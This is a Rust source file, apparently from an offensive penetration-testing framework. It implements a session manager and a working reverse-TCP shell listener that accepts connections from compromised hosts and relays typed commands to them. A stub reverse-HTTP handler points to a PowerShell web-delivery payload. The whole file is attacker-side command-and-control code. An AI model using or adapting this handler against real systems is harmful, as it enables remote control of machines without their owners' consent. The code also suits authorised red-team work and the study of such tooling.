use crate::cli::banner;
use std::io::{Read, Write, BufRead, BufReader};
use std::net::TcpStream;
use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::Arc;
use std::collections::HashMap;
use std::time::{Duration, Instant};

#[derive(Clone, Debug)]
pub enum SessionType {
    ReverseTcp,
    ReverseHttp,
    BindTcp,
    NamedPipe,
}

#[derive(Clone, Debug)]
pub struct TunnelInfo {
    pub lhost: String,
    pub lport: u16,
    pub rhost: String,
    pub rport: u16,
    pub session_type: SessionType,
}

#[derive(Clone)]
pub struct Session {
    pub sid: u32,
    pub session_type: SessionType,
    pub tunnel: TunnelInfo,
    pub payload_uuid: String,
    pub connected_at: Instant,
    pub last_seen: Instant,
    pub active: bool,
    pub platform: String,
}

pub struct SessionManager {
    sessions: Arc<std::sync::Mutex<HashMap<u32, Session>>>,
    sid_pool: AtomicU32,
    active: Arc<std::sync::Mutex<bool>>,
}

impl SessionManager {
    pub fn new() -> Self {
        Self {
            sessions: Arc::new(std::sync::Mutex::new(HashMap::new())),
            sid_pool: AtomicU32::new(1),
            active: Arc::new(std::sync::Mutex::new(false)),
        }
    }

    pub fn register(&self, session_type: SessionType, tunnel: TunnelInfo) -> u32 {
        let sid = self.sid_pool.fetch_add(1, Ordering::SeqCst);
        let session = Session {
            sid,
            session_type,
            tunnel,
            payload_uuid: uuid::Uuid::new_v4().to_string(),
            connected_at: Instant::now(),
            last_seen: Instant::now(),
            active: true,
            platform: "unknown".to_string(),
        };
        
        self.sessions.lock().unwrap().insert(sid, session);
        banner::success(&format!("Session registered: SID {}", sid));
        sid
    }

    pub fn get(&self, sid: u32) -> Option<Session> {
        self.sessions.lock().unwrap().get(&sid).cloned()
    }

    pub fn list(&self) -> Vec<Session> {
        self.sessions.lock().unwrap().values().cloned().collect()
    }

    pub fn deregister(&self, sid: u32) {
        self.sessions.lock().unwrap().remove(&sid);
        banner::info(&format!("Session {} deregistered", sid));
    }

    pub fn set_active(&self, active: bool) {
        *self.active.lock().unwrap() = active;
    }

    pub fn is_active(&self) -> bool {
        *self.active.lock().unwrap()
    }

    pub fn count(&self) -> usize {
        self.sessions.lock().unwrap().len()
    }
}

pub trait Handler: Send + Sync {
    fn handler_type(&self) -> &'static str;
    fn setup(&mut self) -> Result<(), Box<dyn std::error::Error>>;
    fn start(&mut self) -> Result<(), Box<dyn std::error::Error>>;
    fn stop(&mut self);
    fn handle_connection(&self, stream: TcpStream) -> Result<(), Box<dyn std::error::Error>>;
}

pub struct ReverseTcpHandler {
    pub manager: SessionManager,
    pub lhost: String,
    pub lport: u16,
    pub running: bool,
}

impl ReverseTcpHandler {
    pub fn new(lhost: &str, lport: u16) -> Self {
        Self {
            manager: SessionManager::new(),
            lhost: lhost.to_string(),
            lport,
            running: false,
        }
    }

    pub fn listen(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        use std::net::{TcpListener, TcpStream};
        
        let bind_addr = format!("{}:{}", self.lhost, self.lport);
        let listener = TcpListener::bind(&bind_addr)?;
        listener.set_nonblocking(true)?;
        self.running = true;
        self.manager.set_active(true);
        
        banner::print_phase_banner("SESSION HANDLER", &format!("Reverse TCP on {}", bind_addr));
        banner::success(&format!("Listening on {}", bind_addr));
        
        for stream in listener.incoming() {
            if !self.running {
                break;
            }
            
            match stream {
                Ok(stream) => {
                    let peer_addr = stream.peer_addr()?;
                    banner::shell_obtained("Reverse TCP Shell", &peer_addr.to_string());
                    
                    let tunnel = TunnelInfo {
                        lhost: self.lhost.clone(),
                        lport: self.lport,
                        rhost: peer_addr.ip().to_string(),
                        rport: peer_addr.port(),
                        session_type: SessionType::ReverseTcp,
                    };
                    
                    self.manager.register(SessionType::ReverseTcp, tunnel);
                    self.interact(&stream)?;
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    std::thread::sleep(Duration::from_millis(100));
                }
                Err(e) => {
                    banner::error(&format!("Connection error: {}", e));
                }
            }
        }
        
        Ok(())
    }

    pub fn interact(&self, stream: &TcpStream) -> Result<(), Box<dyn std::error::Error>> {
        banner::print_phase_banner("SESSION INTERACTION", "Type commands (exit to quit, back to return to menu)");

        let mut reader = BufReader::new(stream.try_clone()?);

        // Set read timeout so we don't block forever
        stream.set_read_timeout(Some(Duration::from_secs(5)))?;
        let stdin = std::io::stdin();

        loop {
            print!("> ");
            std::io::stdout().flush()?;

            let mut input = String::new();
            match stdin.lock().read_line(&mut input) {
                Ok(0) => break, // EOF (Ctrl+D)
                Ok(_) => {}
                Err(_) => break,
            }

            let cmd = input.trim();
            if cmd == "exit" || cmd == "quit" {
                banner::info("Exiting session...");
                break;
            }
            if cmd == "back" {
                banner::info("Returning to main menu...");
                break;
            }
            if cmd == "help" {
                banner::info("Commands: exit, quit, back, help, bg");
                continue;
            }
            if cmd == "bg" {
                banner::info("Session backgrounded. Return to menu with 'sessions'");
                // Don't break - keep session alive in background
                break;
            }
            if cmd.is_empty() {
                continue;
            }

            // Send command
            if let Ok(mut writer) = stream.try_clone() {
                writer.write_all(format!("{}\n", input).as_bytes())?;
                writer.flush()?;

                std::thread::sleep(Duration::from_millis(100));

                let mut buffer = [0; 4096];
                loop {
                    match reader.read(&mut buffer) {
                        Ok(n) if n > 0 => {
                            let output = String::from_utf8_lossy(&buffer[..n]);
                            print!("{}", output);
                            std::io::stdout().flush()?;
                        }
                        Ok(_) => break,
                        Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => break,
                        Err(ref e) if e.kind() == std::io::ErrorKind::TimedOut => break,
                        Err(e) => {
                            banner::error(&format!("Connection closed: {}", e));
                            break;
                        }
                    }
                }
            }
        }

        // Restore blocking mode
        stream.set_read_timeout(None)?;
        Ok(())
    }
}

impl Handler for ReverseTcpHandler {
    fn handler_type(&self) -> &'static str {
        "reverse_tcp"
    }

    fn setup(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        Ok(())
    }

    fn start(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        self.listen()
    }

    fn stop(&mut self) {
        self.running = false;
        self.manager.set_active(false);
    }

    fn handle_connection(&self, stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
        self.interact(&stream)
    }
}

pub struct ReverseHttpHandler {
    pub manager: SessionManager,
    pub lhost: String,
    pub lport: u16,
    pub running: bool,
}

impl ReverseHttpHandler {
    pub fn new(lhost: &str, lport: u16) -> Self {
        Self {
            manager: SessionManager::new(),
            lhost: lhost.to_string(),
            lport,
            running: false,
        }
    }

    pub fn listen(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        banner::print_phase_banner("HTTP HANDLER", &format!("HTTP on {}:{}", self.lhost, self.lport));
        banner::success(&format!("HTTP handler listening on {}:{}", self.lhost, self.lport));
        banner::info(&format!("Use with: --payload-lang powershell --ps-variant web_delivery --lhost {} --lport {}", self.lhost, self.lport));
        Ok(())
    }
}

impl Handler for ReverseHttpHandler {
    fn handler_type(&self) -> &'static str {
        "reverse_http"
    }

    fn setup(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        Ok(())
    }

    fn start(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        self.listen()
    }

    fn stop(&mut self) {
        self.running = false;
    }

    fn handle_connection(&self, _stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
        Ok(())
    }
}
